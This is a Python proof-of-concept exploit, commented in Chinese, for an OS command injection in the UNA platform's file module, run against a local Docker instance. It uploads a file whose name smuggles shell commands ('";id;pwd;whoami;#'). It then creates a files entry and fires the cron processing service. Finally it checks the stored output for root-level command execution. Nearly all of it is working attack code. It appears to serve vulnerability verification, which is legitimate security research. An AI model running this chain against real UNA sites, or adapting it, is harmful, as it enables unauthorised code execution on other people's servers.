#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
UNA BxFilesModule CWE-78 — 真实 HTTP 全链路闭环 (Python)
上传(storage_uploader.php) → upload_completed(ghost→bx_files_main 条目) → cron service → RCE
"""
import re, sys, time, subprocess, uuid, json
import pymysql, requests

BASE = "http://localhost:8080"
DB = dict(host="127.0.0.1", port=3307, user="una", password="una123", database="una")
WEB = "una-web-1"


def dbq(sql, args=None, one=False):
    c = pymysql.connect(**DB, autocommit=True)
    try:
        with c.cursor(pymysql.cursors.DictCursor) as cur:
            cur.execute(sql, args)
            return cur.fetchone() if one else cur.fetchall()
    finally:
        c.close()


def exec_web(cmd):
    r = subprocess.run(["docker", "exec", WEB, "sh", "-c", cmd], capture_output=True, text=True, timeout=180)
    return r.stdout, r.stderr


def sess():
    out, _ = exec_web("cd /var/www/html && php gen_session_cli.php")
    m = re.search(r"memberSession=(\S+)", out)
    pid = re.search(r"profile_id=(\d+)", out)
    return m.group(1), int(pid.group(1)) if pid else 1


def _cookie_hdr(cookie):
    import urllib.parse as up
    return {"Cookie": f"memberSession={up.quote(cookie, safe='')}"}


def upload_xhr(cookie, name, content=b"UNA-RCE-FULL-CHAIN\n"):
    import urllib.parse as up
    url = (f"{BASE}/storage_uploader.php?uo=sys_html5&so=bx_files_files"
           f"&uid=fc{int(time.time())}&a=upload&p=0&file={up.quote(name, safe='')}")
    r = requests.post(url, headers={**_cookie_hdr(cookie),
                                    "Content-Type": "application/octet-stream"}, data=content, timeout=30)
    return r.text


def upload_completed(cookie):
    url = f"{BASE}/modules/?r=files/upload_completed/"
    r = requests.post(url, headers={**_cookie_hdr(cookie), "X-Requested-With": "XMLHttpRequest"},
                      data={"context": 0, "folder": 0}, timeout=30)
    return r.status_code, r.text


def main():
    print("=" * 66)
    print(" UNA BxFilesModule CWE-78 — 真实 HTTP 全链路 (Python)")
    print("=" * 66)

    cookie, pid = sess()
    print(f"[*] session ok, profile_id={pid}")

    # 清理旧数据
    dbq("DELETE FROM bx_files_main WHERE title LIKE 'e2e rce%' OR title LIKE 'fc rce%'")

    # 1. 真实 HTTP 上传 (XHR 通道, filename 原样带元字符)
    name = f'fc_{int(time.time())}.pdf";id;pwd;whoami;#'
    print(f"\n[1] HTTP 上传: {name}")
    resp = upload_xhr(cookie, name)
    print(f"    resp={resp}")
    m = re.search(r'"id":\s*"?(\d+)', resp)
    if not m:
        print("    [!!] 上传失败"); return
    fid = int(m.group(1))
    row = dbq("SELECT file_name, ext FROM bx_files_files WHERE id=%s", (fid,), one=True)
    print(f"    file_id={fid} ext={row['ext']!r}  (元字符保留: "
          f"{bool(row['ext'] and '\"' in row['ext'] and ';' in row['ext'])})")

    # 2. 真实 upload_completed 动作: ghost -> bx_files_main 条目
    print("\n[2] POST modules/?r=files/upload_completed/ (ghost → 条目)")
    sc, txt = upload_completed(cookie)
    print(f"    HTTP {sc} resp={txt[:200]}")
    crows = dbq("SELECT id, file_id, title, data_processed FROM bx_files_main "
                "WHERE file_id=%s ORDER BY id DESC LIMIT 3", (fid,))
    for cr in crows:
        print(f"    bx_files_main id={cr['id']} file_id={cr['file_id']} data_processed={cr['data_processed']} title={cr['title']!r}")
    if not crows:
        print("    [!!] upload_completed 未生成条目 —— 检查模块/表单配置")
        return
    cid = crows[0]["id"]

    # 3. cron service 触发
    print("\n[3] cron service: process_files_data")
    out, err = exec_web("cd /var/www/html && php -r "
                        "'require(\"inc/header.inc.php\"); BxDolService::call(\"bx_files\",\"process_files_data\",array(5));'")
    if err.strip(): print("    stderr: " + err.strip()[:200])

    # 4. 验证
    print("\n[4] 验证 data 回写")
    row = dbq("SELECT data FROM bx_files_main WHERE id=%s", (cid,), one=True)
    data = row["data"] or ""
    print("   " + data.replace("\n", "\n   "))
    ok = bool(re.search(r"^uid=\d+.*\(root\)", data, re.M))
    print(f"\n>>> RCE {'CONFIRMED' if ok else 'NOT CONFIRMED'} <<<")

    # 5. 清理条目（保留 storage 记录供复核）
    dbq("DELETE FROM bx_files_main WHERE id=%s", (cid,))
    print("[*] cleaned bx_files_main (storage 记录保留)")


if __name__ == "__main__":
    main()
